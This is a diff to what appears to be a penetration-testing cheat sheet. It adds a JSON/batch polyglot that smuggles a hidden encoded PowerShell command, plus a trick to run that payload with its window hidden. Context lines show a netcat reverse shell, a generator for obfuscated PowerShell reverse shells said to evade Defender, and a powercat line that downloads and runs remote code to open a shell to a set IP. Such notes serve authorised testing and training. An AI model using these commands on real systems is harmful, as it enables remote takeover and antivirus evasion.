@@ -76,11 +76,21 @@ echo 'os.system('/bin/bash')'
 perl -e 'exec "/bin/sh";'
 ```
 
+**Polyglot Payloads**
+- Sometimes, you need to format a payload into a different valid filetype
+- `.bat` files are excellent for this, as they'll basically parse through garbage to find executable things to run
+  - For example, if we had to do JSON: `{"x\"& powershell -w hidden -exec bypass -enc {base64} & exit &\"x":"1"}` is valid JSON
+
 **Windows Reverse Shells**
 - Download/transfer netcat (nc.exe within `/usr/share/windows-resources/binaries/nc.exe`)
   - Then run `C:\Windows\Temp\nc.exe -e powershell.exe {IP} {port}` for a Powershell reverse shell
 - Can also just do it with powershell alone - use this python script to generate the obfuscated payload (doesn't trip Defender, as of writing):
+  - If you don't want the command window hanging around for whatever reason, the below can be adapted like so: 
+    - `if not defined _Z (set _Z=1&start /min cmd /c %~f0&exit) else (powershell -w hidden -exec bypass -enc BASE64HERE &exit)`
+      - This will set `_Z=1` on the first run, relaunch the same script minimized, and exit the visible window since `_Z` is now defined
+      - Much faster than simply starting the window minimized
 
+{% raw %}
 ```py
 import base64, sys, random, string
 if len(sys.argv) < 3: print('usage: %s ip port' % sys.argv[0]); sys.exit(0)
@@ -134,6 +144,7 @@ b64 = base64.b64encode(payload.encode('utf-16-le'))
 print("powershell -exec bypass -enc %s" % b64.decode())
 
 ```
+{% endraw %}
 
 - Run [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) - `IEX(New-Object System.Net.WebClient).DownloadString('http://{IP}:{port}/powercat.ps1');powercat -c 192.168.45.220 -p 4444 -e powershell`
 
